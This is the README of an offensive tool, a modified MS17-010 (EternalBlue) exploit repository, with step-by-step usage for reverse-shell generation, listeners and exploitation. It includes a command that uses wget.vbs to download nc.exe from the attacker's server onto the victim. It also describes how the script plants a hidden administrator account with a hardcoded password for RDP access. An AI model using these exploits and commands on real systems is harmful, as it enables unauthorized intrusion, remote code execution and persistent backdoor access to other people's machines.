########################### Auto Blue Light Special ###########################
It's called Auto Blue Light Special because it's just a modification of AutoBlue and because of a conversation my friend Julien and I were having about the old school K-Mart blue light specials

This is a modification of 3ndG4me's AutoBlue found here: https://github.com/3ndG4me/AutoBlue-MS17-010
I also stole the code to add a user from thel3l: https://gist.github.com/thel3l/993f8ed81a56e10525dd4812ad01ff2a

# What does this script do?
This script exploits MS17-010 then writes wget.vbs to a folder and gives you a limited shell. You can use wget.vbs to transfer a file to the victim (nc.exe or maybe your custom executable) to obtain a not-so-limited shell. It also creates a user and adds that user to the administrators group so you can RDP to the machine.

# Have you tested this?
Only on Windows XP x86. It's only going to work when using the zzz_exploit.py script. You might be able to re-use my code in eternalblue_exploit(7,8,10).py to perform these actions. Maybe, maybe not. I haven't tried. To find my modifications, open zzz_exploit.py and ctrl+f for ReverendShell.

# Why did I modify this script?
I was rooting an XP box and was using AutoBlue because I really like it. It just works. However it gives you a rather limited, non-interactive shell. You can't change directories with this shell, I couldn't echo text to a file and I couldn't copy files from a SMB share (which I don't think is the shell's fault). I needed a better shell but to do that required some way of transferring a file to the victim. I could run cscript but I couldn't echo to a file, hence the modification. With wget.vbs you can download a file you're hosting on, say, a python SimpleHTTPServer. Later on I found thel3l's code to add a user and incorporated it into this script.

# How do I use it?
Follow the directions as written. If everything is successful the output will display which folder the wget.vbs file is in. From there simply issue:
`> cscript c:\foldername\wget.vbs http://your.ip.here:port/ncWin32.exe c:\path\on\victim\ncWin32.exe`

And if you want to RDP to the target after the script is run you can issue:
`# rdesktop -u reverendshell x.x.x.x`
The password will be: haxxx

You may view a demo video here: https://youtu.be/HOvV0utZK_w

########################### Auto Blue Light Special ###########################
####### Everything below this line is from the original AutoBlue README #######

# MS17-010 Exploit Code

This is some no-bs public exploit code that generates valid shellcode for the eternal blue exploit and scripts out the event listener with the metasploit multi-handler.

This version of the exploit is prepared in a way where you can exploit eternal blue WITHOUT metasploit. Your options for auto shell generation are to generate shellcode with msfvenom that has meterpreter (i.e. with metasploit) or to generate a normal windows cmd shell (i.e. without metasploit). You may also select between staged and stageless payloads if you wish to avoid utilizing the msfconsole entirely and use netcat/your own shell handler. Alternatively you can elect to brew in your own shellcode.

This allows for this version of the MS17-010 exploit to be a bit more flexible, and also fully functional, as many exploits leave out the steps to compile the kernel shellcode that usually comes with it.

Included is also an enternal blue checker script that allows you to test if your target is potentially vulnerable to MS17-010

run `python eternalblue_checker.py <TARGET-IP>`


## TODO:
1. Testing with non-msfvenom shellcode

## VIDEO TUTORIALS:
- https://www.youtube.com/watch?v=p9OnxS1oDc0
- https://youtu.be/2FwqryKUoX8


## USAGE:
Navigate to the `shellcode` directory in the repo:

run `./shell_prep.sh`

Follow the prompts, for example:
```
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
Eternal Blue Windows Shellcode Compiler

Let's compile them windoos shellcodezzz

Compiling x64 kernel shellcode
Compiling x86 kernel shellcode
kernel shellcode compiled, would you like to auto generate a reverse shell with msfvenom? (Y/n)
y
LHOST for reverse connection:
<YOUR-IP>
LPORT you want x64 to listen on:
<SOME PORT>
LPORT you want x86 to listen on:
<SOME OTHER PORT>
Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
0
```

After the script finishes there will be a shellcode binary named `sc_all.bin` in the shellcode directory


Next, navigate to the main repo directory:

run `listener_prep.sh`

Follow the prompts, for example:
```
 /,-
  ||)
  \\_, )
   `--'
Enternal Blue Metasploit Listener

LHOST for reverse connection:
<YOUR-IP>
LPORT for x64 reverse connection:
<SOME PORT>
LPORT for x86 reverse connection:
<SOME OTHER PORT>
Enter 0 for meterpreter shell or 1 for regular cmd shell:
0
Starting listener...
```

## PWN:
If you have completed the USAGE steps, now you're ready to PWN the target.

run:

`python eternalblue_exploit7.py <TARGET-IP> <PATH/TO/SHELLCODE/sc_all.bin> <Number of Groom Connections (optional)>`

Alternatively you may use `zzz_exploit.py` which is an implementation of the "Eternal" family that uses the same technique from Eternal Romance, Synergy, and Champion.

This is not setup to send back a reverse shell or execute any sort of payload like Eternal Blue is. This uses the functions from mysmb.py to spawn a semi-interactive cmd shell. There are commented out sections of code that can be modified to interact with metasploit or send of custom payloads using the `service_exec()` function call.

All of the code execution functionality can be found in the `do_system_mysmb_session()` function.

This version of the exploit is great for targeting systems that have named pipes available to avoid crashing the target.

run:

`python zzz_exploit.py <TARGET-IP>`


Enternal Blue has only been tested on Windows 7/Server 2008, and Windows 10 10240 (x64)

zzz has only been tested on Windows XP

However the Eternal Blue exploits included in this repo also include support for Windows 8/Server 2012 and *should* work.

The zzz exploit should also work on all targets provided you have access to a named pipe. For some OS's (Windows 10) this may also require credentials of a user who can access this named pipe (This is because on newer versions, Guest and NULL sessions are not supported out of the box).

The original exploit code that this repo pulls from is located here: https://github.com/worawit/MS17-010
